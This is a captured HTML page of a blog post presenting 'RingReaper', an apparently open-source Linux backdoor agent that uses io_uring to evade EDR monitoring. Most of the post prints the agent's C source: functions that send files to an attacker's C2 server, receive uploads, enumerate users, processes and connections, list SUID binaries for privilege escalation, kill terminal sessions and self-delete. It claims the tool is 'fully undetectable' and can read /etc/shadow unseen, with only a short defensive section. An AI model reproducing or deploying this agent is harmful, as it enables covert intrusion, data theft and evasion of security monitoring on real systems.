<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Red Team Tactics: Evading EDR on Linux with io_uring | 0xMatheuZ</title>
<meta name="keywords" content="Red Team">
<meta name="description" content="Learn how to bypass modern defenses with io_uring">
<meta name="author" content="0xMatheuZ">
<link rel="canonical" href="http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Red Team Tactics: Evading EDR on Linux with io_uring" />
<meta property="og:description" content="Learn how to bypass modern defenses with io_uring" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/" /><meta property="article:section" content="hacking" />

<meta property="og:site_name" content="0xMatheuZ" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Red Team Tactics: Evading EDR on Linux with io_uring"/>
<meta name="twitter:description" content="Learn how to bypass modern defenses with io_uring"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Hackings",
      "item": "http://localhost:1313/hacking/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Red Team Tactics: Evading EDR on Linux with io_uring",
      "item": "http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Red Team Tactics: Evading EDR on Linux with io_uring",
  "name": "Red Team Tactics: Evading EDR on Linux with io_uring",
  "description": "Learn how to bypass modern defenses with io_uring",
  "keywords": [
    "Red Team"
  ],
  "articleBody": "Full source code of the project\nhttps://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a “backdoor”, though it’s not persistent yet, at the time of writing, persistence modules haven’t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u003c len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026cqe); int ret = cqe-\u003eres; io_uring_cqe_seen(ring, cqe); if (ret \u003c= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); ssize_t ret = cqe-\u003eres; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \"/var/run/utmp\", buf, sizeof(buf)); if (ret \u003c= 0) { const char *err = \"Error reading /var/run/utmp\\n\"; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \"Logged users:\\n\"); for (int i = 0; i \u003c count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \"%-8s %-8s\\n\", entries[i].ut_user, entries[i].ut_line); if (out_pos \u003e sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \"/proc/net/tcp\", buf, sizeof(buf)); if (ret \u003c= 0) { const char *err = \"Error reading /proc/net/tcp\\n\"; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \"Local Address Remote Address State UID\\n\"); char *line = strtok(buf, \"\\n\"); line = strtok(NULL, \"\\n\"); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \"%u: %8X:%X %8X:%X %X %*s %*s %*s %u\", \u0026sl, \u0026local_ip, \u0026local_port, \u0026rem_ip, \u0026rem_port, \u0026st, \u0026uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \"%d.%d.%d.%d:%d\", (local_ip \u0026 0xFF), (local_ip \u003e\u003e 8) \u0026 0xFF, (local_ip \u003e\u003e 16) \u0026 0xFF, (local_ip \u003e\u003e 24) \u0026 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \"%d.%d.%d.%d:%d\", (rem_ip \u0026 0xFF), (rem_ip \u003e\u003e 8) \u0026 0xFF, (rem_ip \u003e\u003e 16) \u0026 0xFF, (rem_ip \u003e\u003e 24) \u0026 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \"%-22s %-22s %-5X %u\\n\", local_str, rem_str, st, uid); if (out_pos \u003e sizeof(out) - 100) break; line = strtok(NULL, \"\\n\"); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); fd = cqe-\u003eres; io_uring_cqe_seen(ring, cqe); if (fd \u003c 0) { char err[256]; snprintf(err, sizeof(err), \"Failed to open %s: %s\\n\", path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); ret = cqe-\u003eres; io_uring_cqe_seen(ring, cqe); if (ret \u003c= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u003c= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \"%255s %ld\", remote_path, \u0026expected_size) != 2 || expected_size \u003c= 0) { const char *msg = \"Usage: recv \\n\"; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); int fd = cqe-\u003eres; io_uring_cqe_seen(ring, cqe); if (fd \u003c 0) { char err[128]; snprintf(err, sizeof(err), \"Failed to open %s: %s\\n\", remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u003c expected_size) { size_t to_read = (expected_size - offset \u003e BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); ssize_t received = cqe-\u003eres; io_uring_cqe_seen(ring, cqe); if (received \u003c= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \"(none)\"; snprintf(buf, sizeof(buf), \"PID: %d\\nTTY: %s\\n\", pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\"/proc\"); if (!dir) { send_all(ring, sockfd, \"Failed to open /proc\\n\", 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \"PID CMD\\n\"); while ((entry = readdir(dir)) != NULL) { if (entry-\u003ed_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u003ed_name, \u0026endptr, 10); if (*endptr != '\\0') continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \"/proc/%ld/comm\", pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u003e 0) { name[strcspn(name, \"\\n\")] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \"%-7ld %s\\n\", pid, name); if (pos \u003e sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \"\"; char *arg = (char *)arg_raw; trim_leading(\u0026arg); if (strlen(arg) == 0) { DIR *d = opendir(\"/dev/pts\"); if (!d) { snprintf(out, sizeof(out), \"Failed to open /dev/pts: %s\\n\", strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \"Active pts sessions:\\n\"); while ((entry = readdir(d)) != NULL) { if (entry-\u003ed_name[0] \u003e= '0' \u0026\u0026 entry-\u003ed_name[0] \u003c= '9') { pos += snprintf(out + pos, sizeof(out) - pos, \"pts/%s\\n\", entry-\u003ed_name); if (pos \u003e sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \"/dev/pts/%s\", arg); DIR *proc = opendir(\"/proc\"); if (!proc) { snprintf(out, sizeof(out), \"Failed to open /proc: %s\\n\", strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u003ed_name, \u0026endptr, 10); if (*endptr != '\\0') continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \"/proc/%ld/fd\", pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u003ed_name[0] == '.') continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \"%s/%s\", fd_path, fd_ent-\u003ed_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u003c 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \"No process found using %s\\n\", target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \"Killed process %d using %s\\n\", found_pid, target_tty); } else { snprintf(out, sizeof(out), \"Failed to kill process %d: %s\\n\", found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\"/usr/bin\"); if (!dir) { send_all(ring, sockfd, \"Failed to open /usr/bin\\n\", 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \"Potential SUID binaries:\\n\"); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \"/usr/bin/%s\", entry-\u003ed_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); if (cqe-\u003eres == 0 \u0026\u0026 (stx.stx_mode \u0026 S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \"%s\\n\", path); if (pos \u003e sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \"Agent will self-destruct\\n\"; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\"/proc/self/exe\", exe_path, sizeof(exe_path)-1); if (len \u003e 0) { exe_path[len] = '\\0'; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026cqe); if (cqe-\u003eres \u003c 0) { char err[128]; snprintf(err, sizeof(err), \"Unlink failed: %s\\n\", strerror(-cqe-\u003eres)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is “bypass” these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer “door knocks” because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ",
  "wordCount" : "2860",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "0xMatheuZ"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "0xMatheuZ",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="MatheuZ (Alt + H)">
                <img src="https://i.imgur.com/xeSd64L.png" alt="" aria-label="logo"
                    height="25">MatheuZ</a>
            <div class="logo-switches">
                <ul class="lang-switch"><li>|</li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/hacking" title="hacking">
                    <span>hacking</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
    <h1 class="post-title entry-hint-parent">
      Red Team Tactics: Evading EDR on Linux with io_uring
    </h1>
    <div class="post-description">
      Learn how to bypass modern defenses with io_uring
    </div>
    <div class="post-meta">14 min&nbsp;·&nbsp;0xMatheuZ

</div>
  </header> 
  <div class="post-content"><p>Full source code of the project</p>
<p><a href="https://github.com/MatheuZSecurity/RingReaper">https://github.com/MatheuZSecurity/RingReaper</a></p>
<h2 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h2>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#what-is-io_uring">What is io_uring?</a></li>
<li><a href="#the-agent">The Agent</a></li>
<li><a href="#code-analysis">Code Analysis</a></li>
<li><a href="#how-does-the-edr-typically-fail-here">How Does the EDR Typically Fail Here?</a></li>
<li><a href="#practical-edr-bypass">Practical EDR Bypass</a></li>
<li><a href="#python-c2-server-flow">Python C2 Server Flow</a></li>
<li><a href="#defensive-reflections">Defensive Reflections</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as <code>EDR (Endpoint Detection and Response)</code> evolve rapidly, making the work of an attacker more challenging.</p>
<p>We, as <strong>red teamers</strong>, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.</p>
<p>In this article, I will explore the use of <code>io_uring</code>, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.</p>
<h2 id="what-is-io_uring">What is io_uring?<a hidden class="anchor" aria-hidden="true" href="#what-is-io_uring">#</a></h2>
<p><code>io_uring</code> was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using <strong>submission and completion rings</strong>. In other words:</p>
<ul>
<li>The process places I/O requests into a queue shared with the kernel</li>
<li>The kernel executes them when it can, without blocking the user thread</li>
<li>The result comes back through another completion ring</li>
</ul>
<p>The critical point is that this model allows for <strong>multiple operations</strong> (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling <code>read</code>, <code>write</code>, <code>send</code>, <code>connect</code>, everything happens through <code>io_uring_submit()</code> and mapped buffers.</p>
<h2 id="the-agent">The Agent<a hidden class="anchor" aria-hidden="true" href="#the-agent">#</a></h2>
<p>This agent essentially acts as a &ldquo;backdoor&rdquo;, though it&rsquo;s not persistent yet, at the time of writing, persistence modules haven&rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:</p>
<ul>
<li><strong>Network communication</strong> using <code>io_uring_prep_send</code> and <code>io_uring_prep_recv</code></li>
<li><strong>File reading</strong> via <code>io_uring_prep_openat</code> and <code>io_uring_prep_read</code></li>
<li><strong>File upload</strong> without explicit <code>write</code> or <code>read</code> syscalls</li>
<li><strong>Post-exploitation command execution</strong> (listing users, processes, connections, etc.)</li>
<li><strong>Self-deletion</strong> (self-destruct) that removes its own binary using <code>io_uring_prep_unlinkat</code></li>
</ul>
<p>On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.</p>
<h2 id="code-analysis-of-the-agent">Code analysis of the agent<a hidden class="anchor" aria-hidden="true" href="#code-analysis-of-the-agent">#</a></h2>
<p><code>send_all</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">send_all</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">sent</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">sent</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_prep_send</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">sent</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="n">sent</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">sent</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.</p>
<p>Upon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.</p>
<p>The goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.</p>
<p><code>recv_all</code>:</p>
